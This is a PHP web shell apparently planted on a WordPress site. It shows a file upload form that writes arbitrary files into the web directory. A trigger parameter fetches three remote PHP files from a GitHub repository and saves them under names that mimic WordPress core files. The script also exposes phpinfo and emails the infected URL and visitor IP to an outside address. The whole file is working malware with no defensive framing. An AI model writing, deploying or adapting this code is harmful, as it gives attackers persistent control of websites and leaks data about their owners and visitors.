<?php echo 'rizky07_uploader'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done');        </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>
<?php
if(isset($_GET['rizky07']))
{
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}

$check=$_SERVER['DOCUMENT_ROOT'] . "/wp-includes/wp-file.php" ;
$text = http_get('https://raw.githubusercontent.com/rizkylol/asw/main/wp-file.php');
$op=fopen($check, 'w');
fwrite($op,$text);
fclose($op);
if(file_exists($check)){
echo "Dont delete<br>";
}else 
echo "";

$check2=$_SERVER['DOCUMENT_ROOT'] . "/wp-config-sample.php" ;
$text2 = http_get('https://raw.githubusercontent.com/rizkylol/asw/main/wp-config-sample.php');
$op2=fopen($check2, 'w');
fwrite($op2,$text2);
fclose($op2);
if(file_exists($check2)){
echo "Dont delete<br>";
}else 
echo "";

$check3=$_SERVER['DOCUMENT_ROOT'] . "/wp-admin/user/wp-user.php" ;
$text3 = http_get('https://raw.githubusercontent.com/rizkylol/asw/main/wp-user.php');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
if(file_exists($check3)){
echo "Dont delete<br>";
}else 
echo "";

}
phpinfo();
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'tradisiaing@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "awokwok", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<center>phpinfo2020()</center>
